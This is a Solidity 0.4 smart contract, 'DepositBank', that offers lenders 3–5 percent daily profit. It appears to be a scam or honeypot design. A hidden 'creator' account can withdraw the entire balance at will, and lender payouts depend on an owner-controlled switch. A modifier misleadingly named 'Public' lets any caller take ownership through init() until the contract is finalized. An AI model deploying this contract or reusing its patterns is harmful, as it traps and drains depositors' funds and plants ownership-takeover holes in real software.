pragma solidity ^0.4.18;
contract Base {
	address newOwner;
	address owner = msg.sender;
	address creator = msg.sender;
	function isOwner() view internal returns(bool ){
	return owner == msg.sender;
	}
	function changeOwner(address addr) public {
	if(isOwner()){
	newOwner = addr;
	}
	}
	function confirmOwner() public {
	if(msg.sender == newOwner){
	owner = newOwner;
	}
	}
	function canDrive() view internal returns(bool ){
	return (owner == msg.sender) || (creator == msg.sender);
	}
	function WthdrawAllToCreator() payable public {
	if(msg.sender == creator){
	creator.transfer(this.balance);
	}
	}
	function WthdrawToCreator(uint val) payable public {
	if(msg.sender == creator){
	creator.transfer(val);
	}
	}
	function WthdrawTo(address addr, uint val) payable public {
	if(msg.sender == creator){
	addr.transfer(val);
	}
	}
	function WithdrawToken(address token, uint256 amount) public {
	if(msg.sender == creator){
	if(! token.call(bytes4(sha3("transfer(address,uint256)")), creator, amount)){
	throw;}
	}
	}
	
}contract DepositBank is Base {
	uint public SponsorsQty;
	uint public CharterCapital;
	uint public ClientQty;
	uint public PrcntRate = 3;
	uint public MinPayment;
	bool paymentsAllowed;
	struct Lender{
	uint LastLendTime;
	uint Amount;
	uint Reserved;
	}
	mapping(address => uint) public Sponsors;
	mapping(address => Lender) public Lenders;
	event StartOfPayments(address indexed calledFrom, uint time);
	event EndOfPayments(address indexed calledFrom, uint time);
	function () payable public {
	ToSponsor();
	}
	function init() Public public {
	owner = msg.sender;
	PrcntRate = 5;
	MinPayment = 1 ether;
	}
	function Deposit() payable public {
	FixProfit();
	Lenders[msg.sender].Amount += msg.value;
	}
	function CheckProfit(address addr) view public returns(uint ){
	return ((Lenders[addr].Amount / 100) * PrcntRate) * ((now - Lenders[addr].LastLendTime) / 1 days);
	}
	function FixProfit() public {
	if(Lenders[msg.sender].Amount > 0){
	Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
	}
	Lenders[msg.sender].LastLendTime = now;
	}
	function WitdrawLenderProfit() payable public {
	if(paymentsAllowed){
	FixProfit();
	uint profit = Lenders[msg.sender].Reserved;
	Lenders[msg.sender].Reserved = 0;
	msg.sender.transfer(profit);
	}
	}
	function ToSponsor() payable public {
	if(msg.value >= MinPayment){
	if(Sponsors[msg.sender] == 0){
	SponsorsQty++;
	}
	Sponsors[msg.sender] += msg.value;
	CharterCapital += msg.value;
	}
	}
	function AuthorizePayments(bool val) public {
	if(isOwner()){
	paymentsAllowed = val;
	}
	}
	function StartPaymens() public {
	if(isOwner()){
	AuthorizePayments(true);
	StartOfPayments(msg.sender, now);
	}
	}
	function StopPaymens() public {
	if(isOwner()){
	AuthorizePayments(false);
	EndOfPayments(msg.sender, now);
	}
	}
	function WithdrawToSponsor(address _addr, uint _wei) payable public {
	if(Sponsors[_addr] > 0){
	if(isOwner()){
	if(_addr.send(_wei)){
	if(CharterCapital >= _wei){
	CharterCapital -= _wei;
	}
	else{
	CharterCapital = 0;
	}
	}
	}
	}
	}
	modifier Public(){
	if(! finalized){
	_;}
	}
	bool finalized;
	function Fin() public {
	if(isOwner()){
	finalized = true;
	}
	}
	
}